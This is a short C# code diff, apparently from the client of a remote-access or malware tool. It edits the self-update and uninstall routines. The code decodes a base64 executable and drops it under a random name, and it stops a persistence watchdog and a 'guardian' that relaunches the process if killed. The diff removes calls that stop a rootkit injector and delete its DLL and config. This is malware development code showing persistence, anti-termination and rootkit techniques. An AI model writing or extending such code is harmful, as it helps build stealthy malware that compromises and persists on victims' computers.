@@ -1428,9 +1428,7 @@ internal class TlsClient : IDisposable
             var stagePath = Path.Combine(installDir, Guid.NewGuid().ToString("N")[..10] + ".exe");
             await File.WriteAllBytesAsync(stagePath, Convert.FromBase64String(updateData.FileBase64), ct);
 
-            // Tear down ALL protections FIRST — rootkit must not inject into the new
-            // process, guardian must not restart the old one after it exits.
-            if (Config.EnableRootkit) Rootkit.Stop();
+            // Tear down ALL protections FIRST — guardian must not restart the old one after it exits.
             Persistence.StopWatchdog();
             Protection.StopGuardian();
             // StopGuardian writes a stop flag — clear it immediately so the new exe
@@ -1603,10 +1601,6 @@ internal class TlsClient : IDisposable
     {
         try
         {
-            // Stop rootkit injector and remove DLL + s.cfg before the batch cleans directories
-            if (Config.EnableRootkit)
-                Rootkit.Cleanup();
-
             // Stop all protection before uninstalling
             Persistence.StopWatchdog();
             Protection.StopGuardian();    // writes stop flag so surviving guardians won't relaunch
